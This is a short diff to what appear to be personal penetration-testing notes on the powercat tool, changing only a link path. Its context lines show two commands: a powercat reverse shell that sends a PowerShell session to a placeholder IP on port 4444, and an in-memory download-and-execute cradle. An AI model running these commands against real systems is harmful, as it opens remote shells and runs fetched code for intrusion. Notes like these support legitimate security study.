@@ -14,7 +14,7 @@ supports setting up listeners & connecting to listeners using multiple protocols
 
 Example: `powercat -c 192.168.x.x -p 4444 -e powershell`
 
-[[2 Tech-Specifics/OS/Windows/PowerShell|PowerShell]] command to download powercat:
+[[3 Tools/shells/PowerShell|PowerShell]] command to download powercat:
 
 `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/powercat.ps1');`
 
